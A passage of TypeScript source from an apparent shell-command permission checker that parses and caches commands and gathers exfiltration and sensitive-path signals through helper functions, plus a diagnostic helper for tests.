  const key = typeof input === "string" ? `bash-parse\0${input}` : undefined;
  const cached = key === undefined ? undefined : context.facts.get(key) as ParsedShellCommand | undefined;
  if (cached !== undefined) return cached;
  context.visits.lexes += 1;
  const parsed = parseShellFloorCommand(input);
  floorContexts.set(parsed, context);
  if (key !== undefined) context.facts.set(key, parsed);
  return parsed;
}

export function inspectShellCommand(input: ShellCommandInput, cwd?: string, context?: ShellFloorContext): ShellFloorSignals {
  return withFloorContext(input, context, shellFloorBudgetSignals(), (parsed) => shellFact(parsed, `floor-signals\0${cwd ?? ""}`, () => {
    if (!parsed.analysis.ok && shellFloorParserBudgetExceeded(parsed.analysis.reason)) return shellFloorBudgetSignals();
    const exfiltration = shellExfiltrationSignal(parsed, cwd);
    if (exfiltration === SHELL_FLOOR_BUDGET_REASON) return shellFloorBudgetSignals();
    const sensitive = shellSensitivePathSignal(parsed, cwd);
    if (sensitive === SHELL_FLOOR_BUDGET_REASON) return shellFloorBudgetSignals();
    const scan = scanCommand(parsed, cwd);
    const ordinaryAsk = scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk;
    return { sensitive, exfiltration, ...(ordinaryAsk ? { ordinaryAsk } : {}) };
  }));
}

// Diagnostics are observational and never enter a permission verdict.
export function _inspectShellForTest(input: ShellCommandInput, cwd?: string) {
  const context = new ShellFloorContext();
  context.visits.frames += 1;
  const signals = inspectShellCommand(input, cwd, context);
  return { ...signals, visits: { ...context.visits } };
}
